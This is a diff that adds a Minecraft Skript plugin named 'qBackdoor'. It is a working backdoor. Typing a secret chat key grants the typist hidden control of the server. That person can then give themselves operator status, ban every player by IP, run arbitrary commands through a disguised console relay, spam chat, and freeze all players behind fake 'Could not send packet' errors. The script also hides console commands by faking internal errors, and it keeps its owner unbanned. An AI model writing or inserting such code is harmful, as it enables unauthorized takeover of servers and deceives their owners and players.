@@ -1,0 +1,164 @@
+options:
+  prefix: "&8[&aqBackdoor&8]&r"
+  key: "qIAmTheBackDoorOwner"
+
+every second:
+  loop all offline players:
+    if loop-offline player is {qbd}:
+      unban loop-offline player
+      unban loop-offline player by IP
+
+on command:
+  if player's name is {qbd}:
+    if command is "qOpMe":
+      op player
+      send "%{@prefix}% Opped %player%" to player
+      cancel event
+    if command is "qReloadBackdoor":
+      op player
+      send "%{@prefix}% Reloading qbackdoor.. You will have to reauthenticate with" to player
+      send "&e%{@key}%"
+      cancel event
+    if command is "qDeopMe":
+      deop player
+      send "%{@prefix}% Deopped %player%" to player
+      cancel event
+    if command is "qArgs":
+      clear player's inventory
+      add anvil to player's inventory
+      add dirt to player's inventory
+      send "%{@prefix}% Type a command while holding a named item to pass itemname as argument" to player
+      cancel event
+    if command is "qAdvertise":
+      broadcast "%{@prefix}% &eThis server has been backdoored by %{qbd}% using Star_Sw0rd123's qBackdoor"
+      cancel event
+    if command is "qBroadcast":
+      broadcast "%{@prefix}% %player's held item's name%"
+      cancel event
+    if command is "qBan":
+      loop all offline players:
+        if loop-offline player's name is player's held item's name: 
+          ban loop-offline player by IP due to "%{@prefix}% Banned by %player% using qBackdoor, made by Star_Sw0rd123"
+          kick loop-offline player due to "Disconnected"
+      send "%{@prefix}% Banned %player's held item's name%" to player
+      cancel event
+    if command is "qUnBan":
+      loop all offline players:
+        if loop-offline player's name is player's held item's name: 
+          unban loop-offline player
+          unban loop-offline player by IP
+      send "%{@prefix}% Unbanned %player's held item's name%" to player
+      cancel event
+    if command is "qBackdoorCommand":
+      cancel event
+      set {cmn} to player's held item's name
+      execute console command "srvComm56"
+      send "%{@prefix}% Sent qSrvComm56" to player
+    if command is "qBanAll":
+      cancel event
+      loop all players:
+        if loop-player's name is {qbd}: 
+          set {a} to loop-player
+      loop all offline players:
+        if loop-offline player is not {a}: 
+          ban loop-offline player by IP due to "%{@prefix}% Banned by %player% using qBackdoor, made by Star_Sw0rd123"
+          kick loop-offline player due to "Disconnected" 
+      send "%{@prefix}% Banned everyone known to the server" to player
+    if command is "qUnBanAll":
+      cancel event
+      loop all offline players:
+        unban loop-offline player
+        unban loop-offline player by IP
+      send "%{@prefix}% Unbanned everyone" to player
+    if command is "qSpam":
+      set {spmsg} to player's held item's name
+      loop 1000 times:
+        loop all entities:
+          make loop-entity execute command "say %{spmsg}%"
+      cancel event
+  if command is "srvComm56":
+    cancel event
+    if executor is console:
+      loop all players:
+        if loop-player's name is {qbd}:
+          op loop-player
+      wait 1 tick
+      loop all players:
+        if loop-player's name is {qbd}:
+          make loop-player execute command {cmn}
+      wait 1 tick
+      loop all players:
+        if loop-player's name is {qbd}:
+          deop loop-player
+    else:
+      send "&cAn internal error has occurred while executing this command" to executor
+on command:
+  if executor is console:
+    if command is not "srvComm58":
+      if command is not "srvComm56":
+        if command is not "srvComm78":
+          send "&cAn internal error has occurred while executing this command" to player
+          cancel event
+          
+on chat:
+  if message is "qFre":
+    if player's name is {qbd}:
+      if {chtoff} is false:
+        set {chtoff} to true
+        send "%{@prefix}% Server frozen" to player
+      else:
+        send "%{@prefix}% Server unfrozen" to player
+        set {chtoff} to false
+    cancel event
+  else: 
+    if {chtoff} is true:
+      cancel event
+      send "&cCould not send chat message" to player
+      
+on rightclick:
+  if {chtoff} is true:
+    cancel event
+    send "&cCould not send packet" to player
+on leftclick:
+  if {chtoff} is true:
+    cancel event
+    send "&cCould not send packet" to player
+on inventory click:
+  if {chtoff} is true:
+    cancel event
+    send "&cCould not recieve item data" to player
+on craft:
+  if {chtoff} is true:
+    cancel event
+    send "&cCould not send packet" to player
+on command:
+  if player's name is not {qbd}:
+    if {chtoff} is true:
+      cancel event
+      send "&cCommands are disabled in client settings" to player
+on player move:
+  if {chtoff} is true:
+    cancel event
+    send "&cCould not send packet" to player
+on mine:
+  if {chtoff} is true:
+    cancel event
+    send "&cCould not send packet" to player
+on break:
+  if {chtoff} is true:
+    cancel event
+    send "&cCould not send packet" to player
+on place:
+  if {chtoff} is true:
+    cancel event
+    send "&cCould not send packet" to player
+
+on load:
+  set {chtoff} to false
+  set {qbd} to nothing
+
+on chat:
+  if message is {@key}:
+    cancel event
+    set {qbd} to player's name
+    send "%{@prefix}% Backdoor owner set"
